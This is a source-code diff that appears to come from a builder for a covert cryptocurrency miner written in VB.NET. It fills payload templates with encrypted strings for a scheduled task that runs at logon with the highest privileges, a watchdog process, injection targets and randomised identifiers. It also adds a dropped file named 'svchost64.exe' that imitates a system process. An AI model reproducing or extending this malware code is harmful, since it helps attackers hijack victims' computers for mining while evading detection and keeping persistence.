@@ -29,7 +29,6 @@ Public Class Codedom
                 .ReferencedAssemblies.Add("System.Windows.Forms.dll")
             End If
             .ReferencedAssemblies.Add("System.dll")
-            .ReferencedAssemblies.Add("System.Core.dll")
             .ReferencedAssemblies.Add("System.Management.dll")
             .ReferencedAssemblies.Add("System.IO.Compression.dll")
             .ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll")
@@ -208,7 +207,6 @@ Public Class Codedom
             .CompilerOptions = OP
             .IncludeDebugInformation = False
             .ReferencedAssemblies.Add("System.dll")
-            .ReferencedAssemblies.Add("System.Core.dll")
             .ReferencedAssemblies.Add("System.Management.dll")
             If F.FA.toggleEnableDebug.Checked Then
                 .ReferencedAssemblies.Add("System.Windows.Forms.dll")
@@ -314,6 +312,7 @@ Public Class Codedom
         stringb.Replace("#WATCHDOG", F.EncryptString("sihost64"))
         stringb.Replace("#TASKSCH", F.EncryptString("/c schtasks /create /f /sc onlogon /rl highest /tn "))
         stringb.Replace("#MINERID", F.EncryptString("--cinit-find-x"))
+        stringb.Replace("#DROPFILE", F.EncryptString("svchost64.exe"))
         stringb.Replace("#InjectionTarget", F.EncryptString(F.InjectionTarget(0)))
         stringb.Replace("#InjectionDir", F.InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", """ + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + """))
 
@@ -333,6 +332,7 @@ Public Class Codedom
         stringb.Replace("RLoader", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RUninstaller", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RProgram", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("RExit", F.Randomi(F.rand.Next(5, 40)))
 
         stringb.Replace("rarg1", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("rarg2", F.Randomi(F.rand.Next(5, 40)))
